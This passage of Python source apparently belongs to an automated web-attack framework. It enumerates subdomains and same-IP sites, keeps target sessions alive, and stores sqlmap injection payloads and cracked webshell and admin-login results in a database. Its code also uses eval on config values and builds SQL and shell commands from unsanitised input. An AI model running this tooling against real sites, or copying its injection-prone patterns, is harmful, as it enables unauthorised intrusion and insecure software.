            #rlist, _, _ = select([sys.stdin], [], [], timeout[0])
            if len(s)==0:
                chioce[0]=default_choose[0]
            else:
                chioce[0]=s
                print("U choosed:-------------------------(%s)" % chioce[0])
            choosed[0]=1
    time_left_thread = MyThread(print_time_func, ())
    input_thread = MyThread(input_func, ())
    time_left_thread.start()
    input_thread.setDaemon(True)
    input_thread.start()
    time_left_thread.join()
    if choosed[0] == 0 or chioce[0]==default_choose[0]:
        print("U choose default:-------------------------(%s)" % chioce[0])
    return chioce[0]



def get_input_intime(default_choose, timeout=10):
    # http://www.cnblogs.com/jefferybest/archive/2011/10/09/2204050.html
    # 在一定时间内得到选择的值,如果没有选择则返回默认选择
    # 第一个参数为默认选择值
    # 第二个参数为设置超时后自动选择默认值的时间大小,单位为秒
    # 返回选择的值,返回值是选择的值或是默认选择值,选择的值为str类型,默认的选择值可为任意类型
    # 无法输入长字符串,适用于只输入1-2个字符长度的字符串,一般用于选项的选择
    import readline
    default_choose = [default_choose]
    timeout = [timeout]
    choosed = [0]
    chioce = ['']

    def print_time_func():
        while choosed[0] == 0 and timeout[0] > 0:
            time.sleep(1)
            sys.stdout.write(
                '\r' + ' ' * (len(readline.get_line_buffer()) + 2))
            sys.stdout.write(
                "\r%s seconds left...please input your chioce:>" % timeout[0])
            sys.stdout.write(readline.get_line_buffer())
            timeout[0] -= 1
        if choosed[0] == 0:
            chioce[0] = default_choose[0]

    def input_func():
        from select import select
        rlist, _, _ = select([sys.stdin], [], [], timeout[0])
        if rlist:
            s = sys.stdin.readline()
            if len(s) == 1:
                chioce[0] = default_choose[0]
                choosed[0] = 1
                print("you choosed the default chioce:%s" % default_choose[0])
            else:
                chioce[0] = s[:-1]
                choosed[0] = 1
                print("you choosed %s" % chioce[0])
        else:
            pass
            #print("you input nothing")

    time_left_thread = MyThread(print_time_func, ())
    input_thread = MyThread(input_func, ())
    time_left_thread.start()
    input_thread.start()
    time_left_thread.join()

    if choosed[0] == 0:
        print("\n")
        print("i choose the default chioce for you:>>>%s<<<" % chioce[0])
    return chioce[0]



def checkvpn():
    # 检测vpn是否连接成功
    import os
    import re
    # windows:-n 2
    # linux:-c 2
    if os.path.exists(CONFIG_INI_PATH):
        # forcevpn为1时代表强制要求可访问google才返回1,否则函数返回0
        forcevpn = eval(get_key_value_from_config_file(
            CONFIG_INI_PATH, 'default', 'forcevpn'))
        if forcevpn == 1:
            pass
        # 如果forcevpn为0则代表不要求可访问google,直接返回1,表示成功
        else:
            return 1
    else:
        pass

    # 如果不存在配置文件则要求可访问google才返回1
    a = 'wget https://www.google.com/ --timeout=3 -O /tmp/googleTest'
    output = get_string_from_command(a)
    os.system("rm /tmp/googleTest")
    if re.search(r"200 OK", output, re.I):
        return 1
    else:
        return 0


def able_connect_site(site):
    # 检测与site之间是否能成功连接
    import os
    import re
    # windows:-n 2
    # linux:-c 2
    if os.path.exists(CONFIG_INI_PATH):
        # forcevpn为1时代表强制要求可访问google才返回1,否则函数返回0
        forcevpn = eval(get_key_value_from_config_file(
            CONFIG_INI_PATH, 'default', 'forcevpn'))
        if forcevpn == 1:
            pass
        # 如果forcevpn为0则代表不要求可访问google,直接返回1,表示成功
        else:
            return 1
    else:
        pass

    # 如果不存在配置文件则要求可访问google才返回1
    a = 'wget %s --timeout=7 -O /tmp/ableConnectSite' % site
    output = get_string_from_command(a)
    os.system("rm /tmp/ableConnectSite")
    if re.search(r"200 OK", output, re.I):
        return 1
    else:
        return 0


def get_source_main_target_domain_of_pang_url(url):
    # 得到旁站所属的doamin
    global DB_NAME
    import socket
    import re
    import os
    sqli_url_domain = re.sub(r'(https://)|(http://)|(\s)|(/.*)|(:.*)', "", url)
    targets_list = []
    result = execute_sql_in_db("show tables", DB_NAME)
    for each in result:
        if each[0][-5:] == "_pang":
            result = execute_sql_in_db("select http_domain from `%s`" % each[0],DB_NAME) 
            if len(result) > 0:
                for each_http_domain in result:
                    if each_http_domain[0] == get_http_domain_from_url(url):
                        return each[0][:-5].replace("_", ".")
            else:
                #print("get_source_main_target_domain_of_pang_url can not get any main target")
                pass
    return None


def get_source_main_target_domain_of_sub_url(url):
    # 得到子站url对应的主要目标的域名
    # eg.得到http://wit.freebuf.com/1.php对应的结果为数据库中的www.freebuf.com
    # 返回一个字典,eg.{'domain':'www.freebuf.com','http_domain':'http_domain':'http://www.freebuf.com'}
    global DB_NAME
    global FIRST_TARGETS_TABLE_NAME
    global TARGETS_TABLE_NAME

    http_domain = get_http_domain_from_url(url)
    result1 = execute_sql_in_db("select domain from `%s`" % TARGETS_TABLE_NAME,DB_NAME)
    if len(result1) > 0:
        for each in result1:
            if get_root_domain(each[0]) == get_root_domain(http_domain):
                # 返回的domain值
                returnDomain = each[0]
                result1 = execute_sql_in_db("select http_domain from `%s` where domain='%s'" % (TARGETS_TABLE_NAME, returnDomain),DB_NAME)
                if len(result1) > 0:
                    returnHttpDomain = result1[0][0]
                    return {'domain': returnDomain, 'http_domain': returnHttpDomain}

    result2 = execute_sql_in_db("select domain from `%s`" % FIRST_TARGETS_TABLE_NAME,DB_NAME)
    if len(result2) > 0:
        for each in result2:
            if get_root_domain(each[0]) == get_root_domain(http_domain):
                # 返回的domain值
                returnDomain = each[0]
                result2 = execute_sql_in_db("select http_domain from `%s` where domain='%s'" % (FIRST_TARGETS_TABLE_NAME, returnDomain),DB_NAME) 
                if len(result2) > 0:
                    returnHttpDomain = result2[0][0]
                    return {'domain': returnDomain, 'http_domain': returnHttpDomain}

    #print("get_source_main_target_domain_of_sub_url func can not find the result in database")
    return None


def get_url_belong_main_target_domain(url):
    # 结合get_source_main_target_domain_of_pang_url和get_source_main_target_domain_of_sub_url函数得到当前url所属
    # 的主目标的域名,如得到http://wit.freebuf.com/1.php的所属主目标为www.freebuf.com
    flag1 = False
    flag2 = False
    tmp = get_source_main_target_domain_of_sub_url(url)
    if tmp is None:
        flag1 = True
    else:
        sub_main = tmp['domain']
    if not flag1 and sub_main is not None:
        return sub_main
    else:
        pang_main = get_source_main_target_domain_of_pang_url(url)
        if pang_main is not None:
            return pang_main
        else:
            flag2 = True
    if flag1 and flag2:
        return None


def get_sqlmap_result_and_save_result(url):
    # 得到sqlmap对url对应target的扫描结果,并将相关结果存入数据库
    # url is start_url value
    # py3
    # 这个import有可能会因为最开始有过import相同文件的动作而两次的文件不同,导致自己的罗辑错误
    # 这里的import要求是有配置参数的config
    global DB_NAME
    global TARGETS_TABLE_NAME
    global FIRST_TARGETS_TABLE_NAME
    source_domain = get_url_belong_main_target_domain(url)
    sql1 = "select http_domain from `%s` where domain='%s'" % (TARGETS_TABLE_NAME, source_domain)
    sql2 = "select http_domain from `%s` where domain='%s'" % (FIRST_TARGETS_TABLE_NAME, source_domain)
    sql_result1 = execute_sql_in_db(sql1,DB_NAME) 
    print(sql_result1)
    sql_result2 = execute_sql_in_db(sql2,DB_NAME) 
    print(sql_result2)
    if len(sql_result1) > 0:
        http_domain = sql_result1[0]
        tmp_table_name =TARGETS_TABLE_NAME 
    elif len(sql_result2) > 0:
        http_domain = sql_result2[0]
        tmp_table_name = FIRST_TARGETS_TABLE_NAME
    else:
        print("may be your select from db does not return the data you want,check it")
        input()
    url = re.sub(r"(\s)$", "", url)
    if url[:4] == 'http':
        import urllib.parse
        parsed = urllib.parse.urlparse(url)
        domain = parsed.hostname
    else:
        domain = url
    target_folder = HOME_PATH + "/.sqlmap/output/" + domain
    try:
        f = open(target_folder + '/log', "r+")
        log = f.read()
        f.close()
    except:
        print("%s not exist" % target_folder)
        return ""
    find_payload_pattern = re.compile(r"Payload:.*", re.I)
    find_payload = re.findall(find_payload_pattern, log)
    find_payload_pattern = re.compile(r"Payload:.*", re.I)
    find_payload = re.findall(find_payload_pattern, log)
    if len(log) > 0 and find_payload:
        payload_result = ""
        return_payload = []
        for each in find_payload:
            if each not in return_payload:
                return_payload.append(each)
        for each in return_payload:
            payload_result += (each + '\n')
        payload_result = payload_result[:-1]

        with open(target_folder + '/target.txt', "r+") as f:
            domain_result = f.read()
            save_result = domain_result + '\n' + \
                payload_result + '\nsource domain:' + source_domain
            if source_domain[:4] == "http":
                http_domain = source_domain
            # 没有http开头的domain格式
            elif source_domain[:4] != "http" and len(source_domain) > 4:
                http_domain = tmp_table_name
            else:
                print("get source domain of target slqi url wrong,check it")

        auto_write_string_to_sql(
            save_result,
            DB_NAME,
            tmp_table_name,
            "sqlis",
            "start_url",
            url)
        target_or_pang_or_sub_urls_table_name = domain.replace(
            ".", "_") + "_urls"
        auto_write_string_to_sql(
            1,
            DB_NAME,
            target_or_pang_or_sub_urls_table_name,
            "has_sqli",
            "url",
            url)
        return save_result
    else:
        return ""


def get_scan_finished(scaned_column_name, db, table, column_name,column_value):
    # 检测扫描是否完成,返回结果为0或1,0代表没有扫描完,1代表扫描完成
    # scaned_column_name代表对应是否扫描完的字段
    # http_domain_value为表的主键值,http_domain列对应的值
    sql = "select %s from `%s` where %s='%s'" % (
        scaned_column_name, table, column_name,column_value)
    result = execute_sql_in_db(sql, db)
    print("here sql is:")
    print(sql)
    if len(result) > 0:
        if result[0][0] == '1':
            return 1
    return 0


def set_scan_finished(scaned_column_name, db, table,column_name, column_value):
    # 设置相应的扫描完成列值为1代表扫描完成,参数意义同上一个函数
    sql = "update `%s` set %s='%s' where %s='%s'" % (
        table, scaned_column_name, str(1), column_name, column_value)
    execute_sql_in_db(sql, db)


def set_scan_unfinished(scaned_column_name, db, table, column_name,column_value):
    # 设置相应的扫描完成列值为1代表扫描完成,参数意义同上一个函数
    sql = "update `%s` set %s='%s' where %s='%s'" % (
        table, scaned_column_name, str(0), column_name,column_value)
    execute_sql_in_db(sql, db)


def get_one_target_from_db(db, target_table):
    # 从数据库db中的target表中按优先级取出目标
    global SCAN_WAY
    if SCAN_WAY == 1:
        sql = "select start_url from `%s` where scan_finished='0' or pang_domains_scan_finished='0' limit 1" \
            % target_table
    elif SCAN_WAY == 2:
        sql = "select start_url from `%s` where scan_finished='0' or sub_domains_scan_finished='0' limit 1" \
            % target_table
    elif SCAN_WAY == 3:
        sql = "select start_url from % s where scan_finished = '0' or pang_domains_scan_finished = '0' or \
sub_domains_scan_finished = '0' limit 1" % target_table
    elif SCAN_WAY == 4:
        sql = "select start_url from `%s` where scan_finished='0' limit 1" % target_table
    else:
        print("eval(get_key_value_from_config_file(CONFIG_INI_PATH,'default','scan_way')) error in get_one_target_from_db func")
    result = execute_sql_in_db(sql, db)
    if len(result) > 0:
        return result[0][0]
    else:
        # result will be ()
        return None


def searchKeyWords(keyWords, by='bing'):
    # 通过搜索引擎搜索关键字
    # 返回搜索得到的html页面
    # 默认用bing搜索引擎
    bingSearch = "http://cn.bing.com/search?q="
    baiduSearch = "http://www.baidu.com/s?wd="
    return_value = ''
    if by == 'bing':
        result = get_request(bingSearch + keyWords, by="seleniumPhantomJS")
        return_value = result['content']
    if by == 'baidu':
        result = get_request(baiduSearch + keyWords, by="seleniumPhantomJS")
        return_value = result['content']
    return return_value


def get_http_or_https_from_search_engine(domain):
    # 从搜索引擎中得到domain是http还是https
    bingSearch = "http://cn.bing.com/search?q="
    url = bingSearch + "site:" + domain
    urlsList = collect_urls_from_url(url)['y1']
    http_num = https_num = 0
    for each in urlsList:
        if "http://" + domain in each:
            http_num += 1
        if "https://" + domain in each:
            https_num += 1
    if http_num >= https_num and http_num != 0:
        return "http"
    elif http_num < https_num and https_num != 0:
        return "https"
    else:
        # 由搜索引擎判断是http还是https失败[可能是搜索引擎没有收录],返回0
        return 0


def get_http_or_https(domain):
    # 获取domain对应的scheme,如获取www.baidu.com对应的scheme为https,此功能待完善
    # 如果首先请求http成功,则认为是http,不再去看https,因为https有可能是cdn强加的,而它本身是http
    # 不连接vpn访问http://{domain}无法访问,访问https://{domian}却可以访问,这样的情况下可能是这个domain被GFW拦截了
    #.这样的话用exp10it.py模块中的get_http_or_https会得到是https
    # 连接vpn访问http://{domain}可以正常访问,访问https://{domain}也可以正常访问,这样的情况下可能是cdn强制给
    # domain加的https[eg.cloudflare].这样的话用exp10it.py模块中的get_http_or_https会得到http
    # 因此,在尝试获取domain的cdn背后的真实ip时,exp10it.py模块中的get_http_or_https可能因此而受干扰[GFW+cdn]
    # 因此,修改exp10it.py模块中的get_http_or_https函数,先用baidu[site:{domain}]这样查一下对方是http还是https,如果
    # 得不到再用原来get_http_or_https的方法继续

    # 首先由搜索引擎尝试获取
    bing_has_record = False
    bingRecord = get_http_or_https_from_search_engine(domain)
    if bingRecord != 0:
        bing_has_record = True
    else:
        pass
    # 下面正常通过分别访问http和https页面的情况来判断
    _1 = get_request("http://" + domain, by="MechanicalSoup")
    http_title = _1['title']
    http_code = _1['code']
    http_content = _1['content']
    _2 = get_request("https://" + domain, by="MechanicalSoup")
    https_title = _2['title']
    https_code = _2['code']
    https_content = _2['content']
    if http_title == https_title:
        return "http"
    else:
        if http_code == 200 and https_code != 200:
            return "http"
        if https_code == 200 and http_code != 200:
            return "https"
        if http_code == 200 and https_code == 200:
            if bing_has_record:
                return bingRecord
            elif len(http_content) >= len(https_content):
                return "http"
            else:
                return "https"

    return "http"


def getIp(domain):
    # 从domain中获取ip
    import socket
    try:
        myaddr = socket.getaddrinfo(domain, 'http')[0][4][0]
        return myaddr
    except:
        print("getip wrong")


def get_pure_list(list):
    # this is a function to remove \r\n or \n from one sting
    # 得到域名列表
    pure_list = []
    for each in list:
        each = re.sub(r'(https://)|(http://)|(\s)|(/.*)|(:.*)', "", each)
        pure_list.append(each)
        # re.sub(r'\r\n',"",each)
        # re.sub(r'\n',"",each)
    return pure_list


def save_url_to_file(url_list, name):
    # this is my write url to file function:
    file = open(name, "a+")
    file.close()
    for ur in url_list:
        file = open(name, "r+")
        all_lines = file.readlines()
        # print(all_lines)
        # print((len(all_lines)))
        file.close()
        # if ur+"\r\n" not in all_lines:
        if ur + "\n" not in all_lines:
            file = open(name, "a+")
            file.write(ur + "\r\n")
            file.flush()
            file.close()


def bing_search(query, search_type):
    # the main function to search use bing api
    # search_type: Web, Image, News, Video
    if os.path.exists(CONFIG_INI_PATH):
        pass
    else:
        os.system("touch %s" % CONFIG_INI_PATH)
    with open(CONFIG_INI_PATH, 'r+') as f:
        content = f.read()
    if re.search(r"bingapikey", content):
        key = eval(get_key_value_from_config_file(
            CONFIG_INI_PATH, 'default', 'bingapikey'))
    else:
        print("please input your bing api key:")
        key = input()
        update_config_file_key_value(
            CONFIG_INI_PATH, 'default', 'bingapikey', "'" + key + "'")
    query = urllib.parse.quote(query)
    # print "bing_search s query is %s" % query
    # create credential for authentication
    user_agent = 'Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1; Trident/4.0; FDM; .NET CLR 2.0.50727; InfoPath.2; .NET CLR 1.1.4322)'
    import base64
    credentials = str(base64.b64encode((':%s' % key).encode('utf-8')), 'utf-8')
    auth = 'Basic %s' % credentials
    print(auth)
    url = 'https://api.datamarket.azure.com/Data.ashx/Bing/Search/' + search_type + \
        '?Query=%27' + query + '%27&$top=100&$format=json'  # &$top=5&$format=json'
    request = urllib.request.Request(url)
    request.add_header('Authorization', auth)
    request.add_header('User-Agent', user_agent)
    request_opener = urllib.request.build_opener()
    response = request_opener.open(request)
    # python2下后面没有decode('...'),python3下要加decode('...')
    response_data = response.read()
    import chardet
    bytesEncoding = chardet.detect(response_data)['encoding']
    response_data = response_data.decode(encoding=bytesEncoding, errors="ignore")
    import json
    json_result = json.loads(response_data)
    result_list = json_result['d']['results']
    return result_list


def get_ip_domains_list(ip):
    # 不再用bing接口查询旁站
    resp = get_request(
        "https://x.threatbook.cn/7e2935f1ac5e47fd8ae79305f36200c8/ipRelatives?ip=%s&domain=fuck.com" %
        ip, by="MechanicalSoup")
    html = resp['content']
    import re
    returnDomainList = re.findall(r'''target="_blank">(.*)</a>''', html)
    # print(all)
    # print(len(all))
    # print(html)
    return returnDomainList


def get_pang_domains(start_url):
    # 得到target的旁站列表
    # target为如http://www.baidu.com的域名,含http
    
    global DB_NAME
    global SCAN_WAY
    target=get_http_domain_from_url(start_url)
    if target[:4] == "http":
        domain = target.split("/")[-1]
    else:
        print("please make sure param has scheme http or https")
        return
    main_target_table_name = get_main_target_table_name(target)
    result = get_scan_finished(
        "get_pang_domains_finished",
        DB_NAME,
        main_target_table_name,"start_url",
        start_url)
    if result == 1:
        return
    else:
        pass

    if SCAN_WAY in [1, 3]:
        pass
    else:
        return
    figlet2file("geting pang domains", 0, True)
    print(target)

    import os
    if not os.path.exists(LOG_FOLDER_PATH):
        os.system("mkdir %s" % LOG_FOLDER_PATH)
    if not os.path.exists("%s/pang" % LOG_FOLDER_PATH):
        os.system("cd %s && mkdir pang" % LOG_FOLDER_PATH)
    domain_pang_file = "%s/pang/%s_pang.txt" % (
        LOG_FOLDER_PATH, domain.replace(".", "_"))
    domain_pang_table_name = target.split('/')[-1].replace(".", "_") + "_pang"
    import os
    import socket
    if os.path.exists(domain_pang_file):
        # 文件存在说明上次已经获取过旁站结果
        print("you have got the pang domains last time")
        # 如果数据库中存在对应表,但没有内容,说明数据库中表被删除,
        # 后来由于database_init函数在auto_attack重新运行时被执行,又有了旁站表
        # 此时旁站表为空将文件中的旁站写入数据库中
        result = execute_sql_in_db("select http_domain from `%s`" % domain_pang_table_name,DB_NAME) 
        if len(result) == 0:
            with open(domain_pang_file, "r+") as f:
                for each in f:
                    each = re.sub(r"(\s)$", "", each)
                    if each != target:

                        # 这里更新各个旁站的cookie
                        forceAskCookie = eval(get_key_value_from_config_file(
                            CONFIG_INI_PATH, 'default', 'forceAskCookie'))
                        if forceAskCookie == 1:
                            cookie = input(
                                "请输入%s的cookie,直接回车表示不输入cookie\n:>" % each)
                        else:
                            print(
                                "你想输入%s的cookie吗?\ny|Y表示现在输入\nn|N表示现在不输入cookie\n[default 'n']" % each)
                            tmpchoose = get_input_intime('n',3)
                            if tmpchoose in ['y', 'Y']:
                                cookie = input(
                                    "请输入%s的cookie,直接回车表示不输入cookie\n:>")
                            else:
                                cookie = ""
                        update_config_file_key_value(
                            CONFIG_INI_PATH, each, 'cookie', "'" + cookie + "'")

                        # 保持session不失效
                        cookie=get_url_cookie(each)
                        if cookie!="":
                            keep_session_thread = MyThread(keep_session, (each, cookie))
                            keep_session_thread.start()

                        execute_sql_in_db("insert into `%s`(http_domain,domain) values('%s','%s')" % (domain_pang_table_name, each, each.split("/")[-1]),DB_NAME)

                        auto_write_string_to_sql(
                            each,
                            DB_NAME,
                            main_target_table_name,
                            "pang_domains",
                            "start_url",
                            start_url)

                        # 创建除目标domain外的每个旁站的urls表,因为目标domain的urls表之前已经创建过
                        each_pang_urls_table_name = each.split(
                            '/')[-1].replace(".", "_") + "_urls"
                        sql = "create table `%s`(url varchar(250) not null primary key,code varchar(10) not null,\
title varchar(100) not null,content mediumtext not null,has_sqli varchar(50) not null,\
is_upload_url varchar(50) not null,\
like_webshell_url varchar(50) not null default 0,\
cracked_webshell_url_info varchar(50) not null,\
like_admin_login_url varchar(50) not null,\
cracked_admin_login_url_info varchar(50) not null,\
http_domain varchar(70) not null)" % each_pang_urls_table_name
                        execute_sql_in_db(sql,DB_NAME) 
        else:
            return

    else:
        domain_list = []
        http_domain_list = []
        #origin_http_domain_url_list = []

        # xcdnObj=Xcdn(domain)
        #ip = getIp(domain)
        #ip = xcdnObj.return_value
        result = execute_sql_in_db("select actual_ip_from_cdn_scan from `%s` where start_url='%s'" %
                                   (get_main_target_table_name(target), start_url),DB_NAME) 
        if len(result) > 0:
            ip = result[0][0]
            if ip == "has cdn,but can not find actual ip":
                # 此时有cdn但是没有找到真实ip,这种情况不获取旁站,退出当前处理过程
                print(
                    "Sorry,since I can not find the actual ip behind the cdn,I will not get pang domains.")
                return
            elif ip == "0":
                print("did not finish cdn scan till here,it is impossible,check it")
                return
            else:
                pass
        else:
            print("something wrong in func get_pang_domains")
            sys.exit(0)

        print(domain)
        all_nics_ip = socket.gethostbyname_ex(domain)[2]
        #query = "ip:%s" % ip

        domains_to_check=[]
        tmp_domain_list = get_ip_domains_list(ip)
        for each_domain in tmp_domain_list:
            if each_domain not in domain_list and getIp(
                    each_domain) in all_nics_ip:
                domains_to_check.append(each_domain)

        domains_to_write=[]
        def aliveCheck(checkDomain):
            # 17/8/16增加存活检测
            if get_request("http://" + checkDomain, by="MechanicalSoup")['code'] != 0 or get_request("https://"+ checkDomain, by="MechanicalSoup")['code'] != 0:
                domain_list.append(checkDomain)
                domains_to_write.append(get_http_or_https(checkDomain)+"://"+checkDomain)


        with futures.ThreadPoolExecutor(max_workers=20) as executor:
            executor.map(aliveCheck, domains_to_check)

        http_domain_list=domains_to_write
        print(http_domain_list)
        import os
        save_url_to_file(http_domain_list, domain_pang_file)
        for each in http_domain_list:
            each = re.sub(r"(\s)$", "", each)
            if each != target:

                # 这里更新各个旁站的cookie
                forceAskCookie = eval(get_key_value_from_config_file(
                    CONFIG_INI_PATH, 'default', 'forceAskCookie'))
                if forceAskCookie == 1:
                    cookie = input("请输入%s的cookie,直接回车表示不输入cookie\n:>" % each)
                else:
                    print("你想输入%s的cookie吗?\ny|Y表示现在输入\nn|N表示现在不输入cookie\n[default 'n']" % each)
                    tmpchoose = get_input_intime('n',3)
                    if tmpchoose in ['y', 'Y']:
                        cookie = input("请输入%s的cookie,直接回车表示不输入cookie\n:>")
                    else:
                        cookie = ""
                update_config_file_key_value(
                    CONFIG_INI_PATH, each, 'cookie', "'" + cookie + "'")

                # 保持session不失效
                cookie=get_url_cookie(each)
                if cookie!="":
                    keep_session_thread = MyThread(keep_session, (each, cookie))
                    keep_session_thread.start()

                execute_sql_in_db("insert into `%s`(http_domain,domain) values('%s','%s')" % (
                    domain.replace(".", "_") + '_pang', each, each.split('/')[-1]),DB_NAME) 
                # 创建除目标domain外的每个旁站的urls表,因为目标domain的urls表之前已经创建过
                each_pang_urls_table_name = each.split(
                    '/')[-1].replace(".", "_") + "_urls"
                sql = "create table `%s`(url varchar(250) not null primary key,code varchar(10) not null,\
title varchar(100) not null,content mediumtext not null,has_sqli varchar(50) not null,\
is_upload_url varchar(50) not null,\
like_webshell_url varchar(50) not null default 0,\
cracked_webshell_url_info varchar(50) not null,\
like_admin_login_url varchar(50) not null,\
cracked_admin_login_url_info varchar(50) not null,\
http_domain varchar(70) not null)" % each_pang_urls_table_name
                execute_sql_in_db(sql,DB_NAME) 
        f = open(domain_pang_file, "r+")
        all = f.read()
        f.close()
        find_http_domain = re.search(
            r"(http(s)?://%s)" % re.sub(r"\.", "\.", domain), all)
        http_domain = ""
        if find_http_domain:
            http_domain = find_http_domain.group(1)
        else:
            print("can not find http_domain in %s" % domain_pang_file)
        http_domain = target
        pang_domains = ""
        for each in http_domain_list:
            if re.sub(r"(\s)$", "", each) != target:
                pang_domains += (each + '\n')
        auto_write_string_to_sql(
            pang_domains,
            DB_NAME,
            main_target_table_name,
            "pang_domains",
            "start_url",
            start_url)
    execute_sql_in_db(
        "update `%s` set get_pang_domains_finished='1' where start_url='%s'" %
        (main_target_table_name, start_url),DB_NAME) 

def get_root_domain(domain):
    # 得到domain的根域名,eg.www.baidu.com得到baidu.com
    # domain可为http开头或纯domain,不能是非http://+domain的url
    if domain[:4] != "http":
        key=get_domain_key_value_from_url("http://"+domain)
    else:
        key=get_domain_key_value_from_url(domain)
    index=domain.find(key,0)
    return domain[index:]



def get_root_domain_bak(domain):
    # 得到domain的根域名,eg.www.baidu.com得到baidu.com
    # domain可为http开头或纯domain,不能是非http://+domain的url
    if domain[:4] == "http":
        domain = domain.split("/")[-1]
    split_list = domain.split(".")
    i = 1
    returnValue = ""
    while i > 0:
        a = "." + split_list[-i]
        if a in domain_suf_list and a not in [".bing", ".baidu", ".google", ".yahoo"]:
            i += 1
            returnValue = a + returnValue
        else:
            break
    returnValue = split_list[-i] + returnValue
    return returnValue


def get_sub_domains(start_url, use_tool="Sublist3r"):
    # target为http开头+domain
    # 注意target(http://www.baidu.com)要换成如baidu.com的结果,然后再当作参数传入下面可能用的工具中
    # www.baidu.com--->baidu.com,baidu.com是下面工具的参数
    # use_tool为子站获取工具选择
    # Sublist3r工具详情如下
    # 获取子站列表,domain为域名格式,不含http
    # https://github.com/aboul3la/Sublist3r
    # works in python2,use os.system get the execute output

    global DB_NAME
    global SCAN_WAY
    if re.match(r"https?://(\d+\.){3}\d+",start_url,re.I):
        return
    target=get_http_domain_from_url(start_url)

    if target[:4] == "http":
        domain = target.split("/")[-1]
    else:
        print("make sure your para in get_sub_domains func has scheme like http or https")
        return
    main_target_table_name = get_main_target_table_name(target)
    result = get_scan_finished(
        "get_sub_domains_finished",
        DB_NAME,
        main_target_table_name,"start_url",
        start_url)
    if result == 1:
        return
    if result == 0:
        pass
    if SCAN_WAY in [2, 3]:
        pass
    else:
        return
    figlet2file("geting sub domains", 0, True)

    root_domain = get_root_domain(domain)
    if not os.path.exists(LOG_FOLDER_PATH):
        os.system("mkdir %s" % LOG_FOLDER_PATH)
    if not os.path.exists("%s/sub" % LOG_FOLDER_PATH):
        os.system("cd %s && mkdir sub" % LOG_FOLDER_PATH)
    store_file = LOG_FOLDER_PATH + "/sub/" + domain.replace(".", "_") + "_sub.txt"
    Sublist3r_store_file = ModulePath+"Sublist3r/Sublist3r.out.txt"
    subDomainsBrute_store_file = ModulePath+"subDomainsBrute/subDomainsBrute.out.txt"
    sub_domains_table_name = domain.replace(".", "_") + "_sub"

    def Sublist3r(domain):
        # 用Sublist3r方式获取子站
        if not os.path.exists(ModulePath + "Sublist3r"):
            os.system(
                "git clone https://github.com/aboul3la/Sublist3r.git %sSublist3r" % ModulePath)
            # 下面的cd到一个目录只在一句代码中有效,执行完就不在Sublist3r目录里了
            os.system(
                "cd %sSublist3r && pip install -r requirements.txt" % ModulePath)
        os.system("cd %sSublist3r && python sublist3r.py -v -d %s -o %s" %
                  (ModulePath, root_domain, Sublist3r_store_file))
        with open(Sublist3r_store_file, "r+") as f:
            alllines = f.readlines()
        os.system("rm %s" % Sublist3r_store_file)
        
        domains_to_check= []
        for each_sub_domain in alllines:
            each_sub_domain = re.sub(r"\s$", "", each_sub_domain)
            if each_sub_domain not in domains_to_check:
                domains_to_check.append(each_sub_domain)

        domains_to_write=[]
        def aliveCheck(checkDomain):
            # 17/8/16增加存活检测
            if get_request("http://" + checkDomain, by="MechanicalSoup")['code'] != 0 or get_request("https://"+ checkDomain, by="MechanicalSoup")['code'] != 0:
                domains_to_write.append(checkDomain)

        with futures.ThreadPoolExecutor(max_workers=20) as executor:
            executor.map(aliveCheck, domains_to_check)

        with open(Sublist3r_store_file, "a+") as f:
            for each_sub_domain in domains_to_write:
                f.write(each_sub_domain + "\n")

    def subDomainsBrute(domain):
        # 用subDomainsBrute方式获取子站
        # https://github.com/lijiejie/subDomainsBrute.git
        if not os.path.exists(ModulePath + "subDomainsBrute"):
            os.system(
                "git clone https://github.com/lijiejie/subDomainsBrute.git %ssubDomainsBrute" % ModulePath)
            os.system("pip3 install dnspython")
        os.system(
            "cd %ssubDomainsBrute && python subDomainsBrute.py -i -o %s %s" %
            (ModulePath, subDomainsBrute_store_file, root_domain))
        with open(subDomainsBrute_store_file, "r+") as f:
            alllines = f.readlines()
        os.system("rm %s" % subDomainsBrute_store_file)

        domains_to_check= []
        for each_sub_domain in alllines:
            each_sub_domain = re.sub(r"\s$", "", each_sub_domain)
            if each_sub_domain not in domains_to_check:
                domains_to_check.append(each_sub_domain)

        domains_to_write=[]
        def aliveCheck(checkDomain):
            # 17/8/16增加存活检测
            if get_request("http://" + checkDomain, by="MechanicalSoup")['code'] != 0 or get_request("https://"+ checkDomain, by="MechanicalSoup")['code'] != 0:
                domains_to_write.append(checkDomain)

        with futures.ThreadPoolExecutor(max_workers=20) as executor:
            executor.map(aliveCheck, domains_to_check)

        with open(subDomainsBrute_store_file, "a+") as f:
            for each_sub_domain in domains_to_write:
                f.write(each_sub_domain + "\n")

    if not os.path.exists(store_file):

        if use_tool == "all":
            Sublist3r(root_domain)
            os.system(
                "cat %s > %s" % (Sublist3r_store_file, store_file))
            os.system("rm %s" % Sublist3r_store_file)
            subDomainsBrute(root_domain)
            with open(subDomainsBrute_store_file, "r+") as f:
                with open(store_file, "a+") as outfile:
                    for each in f:
                        outfile.seek(0)
                        if each not in outfile.readlines():
                            outfile.seek(2)
                            outfile.write(each)
            os.system("rm %s" % subDomainsBrute_store_file)
        if use_tool == "Sublist3r":
            Sublist3r(domain)
            os.system(
                "cat %s > %s" % (Sublist3r_store_file, store_file))
            os.system("rm %s" % Sublist3r_store_file)
        if use_tool == "subDomainsBrute":
            subDomainsBrute(domain)
            os.system("cat %s > %s" % (subDomainsBrute_store_file, store_file))
            os.system("rm %s" % (ModulePath, subDomainsBrute_store_file))

    else:
        # 文件存在说明上次已经获取sub domains
        print("you have got the sub domains last time")
        result = execute_sql_in_db("select http_domain from `%s`" % sub_domains_table_name,DB_NAME) 

        if len(result) == 0:
            pass
        else:
            return

    http_sub_domains_to_write=[]
    with open(store_file, "r+") as f:
        hintTime = 0
        hintStr1 = "\rplease wait,I am writing sub domains info to database."
        hintStr2 = "\rplease wait,I am writing sub domains info to database.."
        hintStr3 = "\rplease wait,I am writing sub domains info to database..."
        sys.stdout.write(hintStr1)
        for each in f:
            # 有可能会有一个old.version.of.sublist3r.works.better.for....的内容,这个忽略
            if not re.search(r"sublist3r", each, re.I):

                # 下面打印正在写数据到数据库的提示,这里由于有get_request请求，如果目标的子站比较多会共一点时间,
                # 所以提示
                hintTime += 1
                if (hintTime % 3) == 0:
                    sys.stdout.write("\r" + len(hintStr2) * " ")
                    sys.stdout.flush()
                    sys.stdout.write(hintStr3)
                elif (hintTime % 3) == 2:
                    sys.stdout.write("\r" + len(hintStr1) * " ")
                    sys.stdout.flush()
